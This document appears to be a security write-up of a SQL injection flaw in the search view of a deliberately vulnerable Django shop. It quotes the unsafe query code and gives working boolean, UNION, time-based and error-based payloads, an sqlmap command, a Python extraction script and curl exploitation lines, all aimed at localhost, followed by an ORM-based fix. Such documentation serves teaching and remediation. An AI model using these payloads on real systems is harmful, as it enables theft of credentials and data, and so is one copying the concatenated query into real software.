# SQL Injection Vulnerability Documentation

## Vulnerability Overview
**Type**: SQL Injection  
**Location**: `/catalog/?q=` search functionality  
**File**: `eshop/views.py` - `catalog_view` function (lines 360-396)  
**Severity**: Critical  
**OWASP Category**: A03:2021 – Injection  

## Technical Details

### Vulnerable Code
```python
raw_query = f"""
SELECT id, name, description, price, stock, created_at, updated_at 
FROM eshop_product 
WHERE name LIKE '%%{search_query}%%' 
OR description LIKE '%%{search_query}%%'
"""
cursor.execute(raw_query)
```

The vulnerability exists because user input from the `q` parameter is directly concatenated into the SQL query without any sanitization or parameterization.

## Exploitation Steps

### 1. Basic Boolean-Based Injection
**Payload**: `' OR '1'='1`  
**URL**: `http://localhost:8000/catalog/?q=' OR '1'='1`  
**Effect**: Returns all products in the database

### 2. Union-Based Injection
**Payload**: `' UNION SELECT NULL,username,password,NULL,NULL,NULL,NULL FROM auth_user--`  
**URL**: `http://localhost:8000/catalog/?q=' UNION SELECT NULL,username,password,NULL,NULL,NULL,NULL FROM auth_user--`  
**Effect**: Extracts usernames and password hashes

### 3. Time-Based Blind Injection
**Payload**: `'; SELECT CASE WHEN (1=1) THEN pg_sleep(5) ELSE pg_sleep(0) END--`  
**Effect**: Causes 5-second delay if condition is true

### 4. Error-Based Injection
**Payload**: `' AND 1=CAST((SELECT version()) AS int)--`  
**Effect**: Database version disclosed in error message

## Proof of Concept

### Using SQLMap
```bash
sqlmap -u "http://localhost:8000/catalog/?q=test" \
       --batch \
       --risk=3 \
       --level=5 \
       --dbs
```

### Manual Exploitation Script
```python
import requests

# Extract database name
payload = "' UNION SELECT NULL,current_database(),NULL,NULL,NULL,NULL,NULL--"
response = requests.get(f"http://localhost:8000/catalog/?q={payload}")
print(response.text)

# Extract table names
payload = "' UNION SELECT NULL,table_name,NULL,NULL,NULL,NULL,NULL FROM information_schema.tables WHERE table_schema='public'--"
response = requests.get(f"http://localhost:8000/catalog/?q={payload}")
print(response.text)
```

## Impact Analysis

### Confidentiality Impact
- Access to all database contents
- User credentials exposure
- Personal information disclosure
- Business data theft

### Integrity Impact
- Data modification capability
- Product price manipulation
- Order tampering
- Account takeover

### Availability Impact
- Database resource exhaustion
- Denial of Service attacks
- Data deletion capability

## Remediation

### Immediate Fix
Replace the vulnerable code with parameterized queries:

```python
# Secure implementation using Django ORM
products = Product.objects.filter(
    Q(name__icontains=search_query) | 
    Q(description__icontains=search_query)
)
```

### Additional Security Measures
1. **Input Validation**: Whitelist allowed characters
2. **Prepared Statements**: Use parameterized queries
3. **Least Privilege**: Database user with minimal permissions
4. **WAF Rules**: Block common SQL injection patterns
5. **Security Headers**: Add X-Content-Type-Options

## Testing Commands

### Detection
```bash
# Check if vulnerable
curl "http://localhost:8000/catalog/?q='+OR+'1'='1"

# Time-based detection
time curl "http://localhost:8000/catalog/?q=';SELECT+pg_sleep(5)--"
```

### Exploitation
```bash
# Extract database version
curl "http://localhost:8000/catalog/?q='+UNION+SELECT+NULL,version(),NULL,NULL,NULL,NULL,NULL--"

# Extract current user
curl "http://localhost:8000/catalog/?q='+UNION+SELECT+NULL,current_user,NULL,NULL,NULL,NULL,NULL--"
```

## References
- [OWASP SQL Injection](https://owasp.org/www-community/attacks/SQL_Injection)
- [CWE-89: SQL Injection](https://cwe.mitre.org/data/definitions/89.html)
- [SQLMap Documentation](https://sqlmap.org/)